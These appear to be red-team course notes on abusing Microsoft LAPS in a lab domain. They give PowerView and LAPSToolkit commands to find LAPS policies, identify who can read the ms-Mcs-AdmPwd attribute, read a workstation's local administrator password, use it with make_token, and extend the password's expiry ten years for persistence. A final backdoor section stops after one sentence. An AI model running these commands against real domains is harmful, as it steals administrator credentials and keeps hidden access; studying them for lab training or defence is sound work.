# Local Administrator Password Solution Notes

Tools:
[GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)

can check locally for files
```
ls C:\Program Files\LAPS\CSE
```

GPO search
```
powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
```

or computer objects with the ms-Mcs-AdmPwdExpirationTime property is not null
```
powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
```

we can download the policy of the GPO object
```
ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{<GPO>}\Machine
download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{<GPO>}\Machine\Registry.pol
```

offline on attacker machine
```
Parse-PolFile .\Desktop\Registry.pol
```


**Reading ms-Mcs-AdmPwd**
Tools:
[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

we can discover principals who can read this password
```
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier
or:
powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
powershell Find-LAPSDelegatedGroups
```

To get a computer's password, simply read the attribute.
```
powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
abuse:
make_token .\LapsAdmin <password>
```

**Password Expiration Protection**

If the policy setting is left "not configured" in the GPO, then password expiration protection is disabled by default.
Since we were able to compromise WKSTN-1 using its LAPS password, we can set its expiration long into the future as a form of persistence.

```
powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
```
where 133101494718702551 is Thursday, 13 October 2022 15:44:31 GMT
use this to create them: (https://www.epochconverter.com/ldap)

to push out 10 years 
```
powershell Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
```

**LAPS Backdoors*

This module will demonstrate this idea using the LAPS PowerShell cmdlet Get-AdmPwdPassword.  If installed on a machine, the LAPS PowerShell modules can be found under C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS









